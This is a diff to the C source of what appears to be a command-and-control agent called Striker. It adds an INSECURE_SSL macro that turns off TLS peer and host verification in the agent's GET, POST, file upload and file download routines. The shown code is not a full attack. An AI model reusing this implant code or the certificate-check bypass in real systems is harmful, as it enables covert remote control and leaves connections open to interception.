@@ -7,8 +7,15 @@
 
 #include "striker.h"
 
+/**
+ * Uncomment the following macro to disable SSL verification.
+ * Insecure, but required for using self-signed SSL certs.
+ */
+// #define INSECURE_SSL
+
 // Uncomment the below macro to enable debug output
 // #define STRIKER_DEBUG
+
 // Size of agent UID
 #define AGENT_UID_SIZE 17
 // Max task result size in bytes
@@ -28,13 +35,6 @@
 // Max length for URL hostname, and path.
 #define MAX_URL_HOST_LEN 100
 #define MAX_URL_PATH_LEN 256
-
-/**
- * Uncomment these macros to disable SSL verification.
- * Very insecure, but required for using self-signed SSL certs.
- */
-// #define SKIP_PEER_VERIFICATION
-// #define SKIP_HOST_VERIFICATION
 
 // Markers for the agent builder.
 char BASE_URL[URL_SIZE] = "[STRIKER_URL]";
@@ -118,16 +118,14 @@ int http_get(char *url, buffer *body){
       free(target_url);
       exit(EXIT_FAILURE);
     }
+    #ifdef INSECURE_SSL
+      curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
+      curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
+    #endif
     curl_easy_setopt(curl, CURLOPT_URL, target_url);
     curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1);
     curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, body_receiver);
     curl_easy_setopt(curl, CURLOPT_WRITEDATA, body);
-    #ifdef SKIP_PEER_VERIFICATION
-      curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
-    #endif
-    #ifdef SKIP_HOST_VERIFICATION
-      curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
-    #endif
     CURLcode res = curl_easy_perform(curl);
     int rsp_code;
     curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &rsp_code);
@@ -196,6 +194,10 @@ int http_post(char *url, cJSON *data, buffer *body){
     }
     char *post_body = cJSON_PrintUnformatted(data);
     struct curl_slist *post_headers = curl_slist_append(NULL, strs[0]);
+    #ifdef INSECURE_SSL
+      curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
+      curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
+    #endif
     curl_easy_setopt(curl, CURLOPT_URL, target_url);
     curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1);
     curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, body_receiver);
@@ -313,6 +315,10 @@ short int upload_file(char *url, char *filename, FILE *rfo, buffer *result_buff)
   #ifdef IS_LINUX
     buffer *body = create_buffer(0);
     CURL *curl = curl_easy_init();
+    #ifdef INSECURE_SSL
+      curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
+      curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
+    #endif
     curl_easy_setopt(curl, CURLOPT_URL, url);
     curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, body_receiver);
     curl_easy_setopt(curl, CURLOPT_WRITEDATA, body);
@@ -347,6 +353,10 @@ short int download_file(char *url, FILE *wfo, buffer *result_buff){
   #ifdef IS_LINUX
     CURLcode res;
     CURL *curl = curl_easy_init();
+    #ifdef INSECURE_SSL
+      curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
+      curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
+    #endif
     curl_easy_setopt(curl, CURLOPT_URL, url);
     curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1);
     curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, body_downloader);
